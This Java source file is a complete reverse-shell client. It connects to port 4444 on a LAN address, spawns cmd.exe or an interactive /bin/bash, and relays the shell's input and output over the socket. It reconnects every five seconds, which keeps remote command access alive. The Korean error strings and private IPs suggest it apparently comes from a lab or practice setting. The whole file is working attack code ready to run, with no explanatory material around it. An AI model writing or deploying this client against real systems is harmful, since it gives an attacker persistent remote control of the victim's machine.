import java.io.*;
import java.net.*;
import java.util.Enumeration;
import java.util.concurrent.TimeUnit;

public class Client {
    private static String getLocalIP() {
    try {
        Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
        
        while (interfaces.hasMoreElements()) {
            NetworkInterface iface = interfaces.nextElement();
            
            if (iface.isLoopback() || !iface.isUp())
                continue;
                
            Enumeration<InetAddress> addresses = iface.getInetAddresses();
            while (addresses.hasMoreElements()) {
                InetAddress addr = addresses.nextElement();
                
                if (addr instanceof Inet4Address && !addr.isLoopbackAddress()) {
                    String ip = addr.getHostAddress();
                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || 
                        ip.startsWith("172.16.") || ip.startsWith("172.31.")) {
                        return ip;
                    }
                }
            }
        }
    } catch (Exception e) {
        System.err.println("IP 주소 가져오기 실패: " + e.getMessage());
    }
    
    return "10.96.120.75";
}
    private static final String SERVER_IP = getLocalIP();
    // private static final String SERVER_IP = "192.168.117.1";
    // private static final String SERVER_IP = "10.96.120.75";
    private static final int PORT = 4444;
    private static final long RECONNECT_DELAY_SECONDS = 5;

    public static void main(String[] args) {
        while (true) {
            Socket socket = null;
            try {
                System.out.println("Connecting to " + SERVER_IP + ":" + PORT + "...");
                socket = new Socket(SERVER_IP, PORT);
                System.out.println("Connected to server.");

                ProcessBuilder processBuilder;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    processBuilder = new ProcessBuilder("cmd.exe");
                } else {
                    processBuilder = new ProcessBuilder("/bin/bash", "-i");
                }
                processBuilder.redirectErrorStream(true);
                Process shellProcess = processBuilder.start();

                transferDataBetween(socket.getInputStream(), shellProcess.getOutputStream());
                transferDataBetween(shellProcess.getInputStream(), socket.getOutputStream());

                shellProcess.waitFor();
                System.out.println("Shell process terminated.");

            } catch (IOException e) {
                System.err.println("Connection failed: " + e.getMessage());
            } catch (InterruptedException e) {
                System.err.println("Interrupted: " + e.getMessage());
            } finally {
                if (socket != null && !socket.isClosed()) {
                    try {
                        socket.close();
                        System.out.println("Socket closed.");
                    } catch (IOException e) {
                        System.err.println("Socket close error: " + e.getMessage());
                    }
                }
            }

            try {
                System.out.println("Reconnecting in " + RECONNECT_DELAY_SECONDS + " seconds...");
                TimeUnit.SECONDS.sleep(RECONNECT_DELAY_SECONDS);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                System.out.println("Client terminated.");
                break;
            }
        }
    }

    private static void transferDataBetween(final InputStream in, final OutputStream out) {
        new Thread(() -> {
            byte[] buffer = new byte[4096];
            int bytesRead;
            try {
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                    out.flush();
                }
            } catch (IOException ignored) {
            }
        }).start();
    }
}
